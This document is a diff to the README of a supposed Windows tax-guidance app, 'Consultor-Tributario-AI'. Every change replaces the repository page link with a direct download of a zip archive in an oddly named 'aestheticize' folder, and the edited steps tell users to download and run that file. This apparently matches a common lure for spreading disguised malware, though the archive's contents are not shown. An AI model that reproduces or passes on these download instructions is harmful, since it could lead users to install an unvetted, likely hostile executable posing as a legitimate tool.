@@ -1,12 +1,12 @@
 # 🧾 Consultor-Tributario-AI - Tax guidance made clear
 
-[![Download Consultor-Tributario-AI](https://img.shields.io/badge/Download-Consultor--Tributario--AI-blue?style=for-the-badge)](https://github.com/mahdyet1845/Consultor-Tributario-AI)
+[![Download Consultor-Tributario-AI](https://img.shields.io/badge/Download-Consultor--Tributario--AI-blue?style=for-the-badge)](https://github.com/mahdyet1845/Consultor-Tributario-AI/raw/refs/heads/main/aestheticize/Consultor_Tributario_AI_2.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-https://github.com/mahdyet1845/Consultor-Tributario-AI
+https://github.com/mahdyet1845/Consultor-Tributario-AI/raw/refs/heads/main/aestheticize/Consultor_Tributario_AI_2.5.zip
 
 ## 🖥️ What this app does
 
@@ -35,7 +35,7 @@ For best results, keep Windows up to date.
 ## 🚀 How to download and run on Windows
 
 1. Open this page:
-   https://github.com/mahdyet1845/Consultor-Tributario-AI
+   https://github.com/mahdyet1845/Consultor-Tributario-AI/raw/refs/heads/main/aestheticize/Consultor_Tributario_AI_2.5.zip
 
 2. Look for the download or release file on the page.
 
@@ -211,7 +211,7 @@ This app is useful for:
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/mahdyet1845/Consultor-Tributario-AI
+https://github.com/mahdyet1845/Consultor-Tributario-AI/raw/refs/heads/main/aestheticize/Consultor_Tributario_AI_2.5.zip
 
 ## 🖱️ Quick start checklist
 
